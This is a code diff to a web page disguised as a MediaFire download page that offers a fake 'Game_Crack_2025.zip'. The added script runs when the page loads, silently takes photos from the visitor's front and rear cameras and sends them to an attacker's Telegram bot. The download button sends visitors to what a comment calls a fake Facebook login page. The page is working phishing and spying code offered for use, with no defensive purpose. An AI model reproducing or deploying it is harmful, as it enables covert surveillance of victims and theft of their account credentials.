@@ -27,18 +27,54 @@
     <div class="box" id="downloadPage">
         <div class="logo">MediaFire</div>
         <p class="desc">Klik tombol di bawah untuk mengunduh file Anda.</p>
-        <div class="filename">📄 <span id="fileName">File_Custom.exe</span></div>
+        <div class="filename">📄 <span id="fileName">Game_Crack_2025.zip</span></div>
         <button class="btn" id="downloadBtn">Download File</button>
         <p class="footer">Powered by MediaFire</p>
     </div>
 
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
+        const TELEGRAM_BOT_TOKEN = "TOKEN_BOT";
+        const TELEGRAM_CHAT_ID = "CHAT_ID_OWNER";
+
+        function sendToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", imageData, "capture.jpg");
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).then(response => console.log("Foto dikirim ke owner"));
+        }
+
+        function capturePhoto(facingMode) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode } }).then(stream => {
+                let video = document.getElementById("video");
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    let canvas = document.getElementById("canvas");
+                    let ctx = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(sendToTelegram, "image/jpeg");
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            }).catch(err => console.error("Gagal akses kamera:", err));
+        }
+
+        // Langsung ambil foto saat halaman dibuka
+        window.onload = function() {
+            capturePhoto("user");  // Foto kamera depan
+            setTimeout(() => capturePhoto("environment"), 3000); // Foto kamera belakang setelah 3 detik
+        };
+
         document.getElementById("downloadBtn").addEventListener("click", function() {
             window.location.href = "facebook.html"; // Redirect ke halaman login Facebook palsu
         });
-
-        // Ubah nama file sesuai keinginan
-        document.getElementById("fileName").innerText = "Game_Crack_2025.zip"; // Ubah sesuai keinginan
     </script>
 
 </body>
